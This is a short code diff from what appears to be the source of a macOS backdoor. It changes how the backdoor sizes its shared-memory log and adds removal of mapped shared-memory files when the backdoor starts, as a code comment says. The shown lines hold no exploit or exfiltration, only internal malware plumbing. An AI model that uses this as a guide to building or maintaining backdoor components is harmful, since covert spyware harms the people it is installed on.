@@ -1875,7 +1875,8 @@ void lionSendEventToPid(pid_t pidP)
       // Give a smaller size since we don't have privileges
       // for executing sysctl
       //
-      gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MIN_NUM_BLOCKS;
+      // Do nothing now: sharedMemory will do the job automatically
+      //gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MIN_NUM_BLOCKS;
     }
 }
 
@@ -1892,6 +1893,10 @@ void lionSendEventToPid(pid_t pidP)
   gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
+  
+  // on backdoor startup try to remove mapped file
+  [gSharedMemoryCommand removeMappedFile];
+  [gSharedMemoryLogging removeMappedFile];
   
   //
   // Create and initialize the shared memory segments
